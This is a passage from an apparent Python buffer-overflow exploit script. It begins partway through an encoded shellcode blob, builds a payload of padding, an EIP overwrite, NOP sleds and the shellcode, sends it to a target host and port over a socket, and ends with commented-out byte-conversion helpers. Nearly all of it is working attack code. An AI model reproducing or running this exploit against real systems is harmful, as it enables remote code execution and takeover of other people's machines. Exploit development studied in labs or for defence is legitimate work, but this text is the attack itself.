        "\x96\x56\x6f\x05\x53\x56\x52\x6d\x07\xdc\xcd\x5a\xfa\xd0"
        "\x86\xfd\x05\x78\x2d\x5d\x6d\x05\x45\x05\x05\x6f\x05\x55"
        "\x6d\x0e\x2a\x0a\x35\xfa\xd0\x52\x6d\x70\x6b\x48\x64\xfa"
        "\xd0\x5b\x5b\xfa\x09\x21\x0a\x80\x75\xfa\xfa\xfa\xec\x9e"
        "\xfa\xfa\xfa\x04\xc6\x2c\xc3\x70\xc4\xc6\xbe\xf5\xb0\xa7"
        "\x53\x6f\x05\x56\xfa\xd0\x36\x80" # 400
    )
    converted = convert_for_send(
        f"{slack1}{EIP}{nopsled}{shellcode}{nopsled}"
    )
    # print([int(ord(x)) for x in converted])
    slack2 = "\x90" * (oflow_sz - (sum(iter(len(x) for x in[
        opcode,
        preamble,
        converted,
    ]))))
    buf = f"{opcode}{preamble}{converted}{slack2}"


    sock = sender(ip, port,buf)
    sock.recv(1024)  ## clear the airwaves
    sock.close()  

# def unpacklatin(fmt, inp):
#         return unpack(fmt, inp.encode('latin-1'))[0]

# def uniesc_to_bytestr(instring):
#     r""" '\\x58\\x59\\x5a\\xa0' -> 'XYZ\xa0' 
#         hexstrings in from cli, ex., argparse   """
#     return bytes(instring, 'utf-8').decode("unicode_escape")

# def bytestr_to_long(inbstr):
#     r""" 'XYZ\xa0' -> 2690275672 """
#     return unpack("I",bytes(inbstr,'latin-1'))[0]

# def long_to_bytestr(inlong):
#     r""" 2690275672 -> 'XYZ\xa0' """
#     return pack("<L", inlong).decode('latin-1')

# def octalstring_to_bytestr_pad(inoct):
#     r""" "0x200" -> '\x00\x02\x00\x00' (le) 
#         for the --va + --addbase scenario 
#         pad with \x00 to dword size bytes """
#     return pack("<L", (int(inoct,16))).decode('latin-1')

# def octalstring_to_bytestr_nopad(inoct):
#     r""" "0x200" -> '\x00\x02' (le) 
#         for the --va only scenario 
#         no padding with \x00 to dword size bytes """
#     octstr = inoct[2:]
#     if len(octstr) % 2 == 1:
#         octstr = f"0{octstr}"
#     return ''.join([chr(int(octstr[x:x+2],16)) for x in range(0,len(octstr),2)][::-1])

if __name__=="__main__":
    main()

